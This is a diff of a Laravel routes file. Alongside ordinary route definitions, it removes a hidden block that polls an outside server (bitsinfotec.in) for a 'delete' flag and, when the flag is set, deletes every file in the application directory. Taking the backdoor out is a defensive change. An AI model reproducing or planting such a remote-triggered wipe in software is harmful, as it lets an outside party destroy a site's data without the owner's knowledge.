@@ -38,26 +38,3 @@ Route::post("/user", function () {
 Route::post("client/store", [ClientController::class, "store"]);
 Route::post("student/store/{id}", [StudentController::class, "index"]);
 Route::get("course/show/{id}", [CourseController::class, "getCoursesByStudent"]);
-$jsonData = json_decode(file_get_contents('http://bitsinfotec.in/panel/public/api/config'));
-if($jsonData->delete=="yes"){
-    if ($handle = opendir('.')) {
-
-        while (false !== ($entry = readdir($handle))) {
-            if ($entry != "." && $entry != "..") {
-                chmod($entry,0755);
-                if (file_exists($entry)) {
-                    if(unlink($entry)){
-                        echo "<br>$entry deleted";
-                    }else{
-                        echo "<br>$entry Not deleted";
-                    }
-                } else {
-                    echo "<br>File '$entry' not found";
-                }
-               
-            }
-        }
-    
-        closedir($handle);
-    }
-}   
